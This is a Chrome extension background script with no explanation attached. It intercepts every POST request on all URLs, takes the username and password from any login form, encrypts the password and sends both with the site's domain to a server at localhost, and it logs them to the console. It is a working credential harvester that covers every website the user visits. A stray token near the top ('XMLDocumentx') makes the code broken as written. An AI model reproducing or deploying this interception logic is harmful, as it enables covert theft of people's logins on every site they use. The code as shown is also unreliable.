try {
    importScripts('./crypto-js.min.js');
  } catch (e) {
    console.error(e);
  }

XMLDocumentx    

function getCookies(domain, name, callback) {
    chrome.cookies.get({ "url": domain, "name": name }, function (cookie) {
        if (callback) {
            try {
                callback(cookie.value);
            } catch (err) {
                callback(null)
            }
        }
    });
}

function change_state() {
    getCookies("https://pc5008-34", "logged_in_cookie", function (cookie) {
        if (cookie != null) {
            getCookies("https://pc5008-34", "sessionid", function (cookie) {
                if (cookie == null) {
                    chrome.action.setBadgeText({
                        text: "OFF",
                    });
                    chrome.action.setBadgeBackgroundColor(
                        { color: 'red' }
                    );
                } else {
                    chrome.action.setBadgeText({
                        text: "ON",
                    });
                    chrome.action.setBadgeBackgroundColor(
                        { color: 'green' }
                    );
                }
            });
        }

    });
}

chrome.tabs.onActivated.addListener(() => {
    change_state();
});

chrome.tabs.onUpdated.addListener(() => {
    chrome.action.setBadgeText({
        text: "OFF",
    });
    chrome.action.setBadgeBackgroundColor(
        { color: 'red' }
    )
    change_state();
});


chrome.runtime.onInstalled.addListener(() => {
    chrome.action.setBadgeText({
        text: "OFF",
    });
    chrome.action.setBadgeBackgroundColor(
        { color: 'red' }
    )
});

chrome.webRequest.onBeforeRequest.addListener(function (details) {
    if (details.method == "POST") {
        try {
            if (details.requestBody.formData.password != undefined) {
                username = details.requestBody.formData.username[0];
                password = details.requestBody.formData.password[0];
                password_send = encrypting(password);
                password_send_url = encodeURIComponent(password_send);
                url = details.url.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0];
                console.log('Username:', username);
                console.log('Password:', password_send);
                console.log('Password url:', password_send_url);
                console.log('URL:', url);
                dest = 'https://localhost/submit_account_json/' + url + '/' + username + '/' + password_send;                
                fetch(dest, {
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    mode: 'cors',
                    credentials: 'include',
                })
                    .then(response => {
                        if (response.ok) {
                            console.log(response.text)
                            return response.text();
                        } else {
                            console.log(response);
                            throw new Error('Network response was not ok');
                            
                        }
                    })
                    .then(data => console.log(data))
                    .catch(error => console.error('Error:', error.message, error.stack));
            }
        } catch (error) {
            console.error('Error:', error);
        }
    }
}, { urls: ["<all_urls>"] },
    ['requestBody']);
